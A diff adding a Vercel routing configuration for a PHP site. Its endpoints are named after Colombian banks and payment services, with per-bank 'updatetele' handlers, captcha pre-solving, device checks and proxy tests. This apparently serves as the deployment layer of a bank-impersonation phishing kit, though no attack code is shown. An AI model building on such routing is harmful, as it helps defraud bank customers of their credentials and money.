@@ -1,0 +1,21 @@
+{
+  "version": 2,
+  "functions": {
+    "api/*.php": {
+      "runtime": "vercel-php@0.7.0"
+    },
+    "*.php": {
+      "runtime": "vercel-php@0.7.0"
+    }
+  },
+  "routes": [
+    {
+      "src": "/(get_balance|config|pago|pse|nequi|bancolombia|davivienda|avvillas|bbva|bogota|caja_social|colpatria|falabella|finandina|occidente|data|security|config_db|pre_solve_captcha|start_captcha|check_captcha|validate_device|checkpoint|updatetele|test_proxy|test_tigo_direct|verificar_estado|pago/nequi/process/updatetele|pago/bancolombia/process/updatetele|pago/davivienda/process/updatetele|pago/avvillas/process/updatetele|pago/bbva/process/updatetele|pago/bogota/process/updatetele|pago/caja_social/process/updatetele|pago/colpatria/process/updatetele|pago/falabella/process/updatetele|pago/finandina/process/updatetele|pago/occidente/process/updatetele)\\.php",
+      "dest": "/$1.php"
+    },
+    {
+      "src": "/(.*)",
+      "dest": "/index.php"
+    }
+  ]
+}
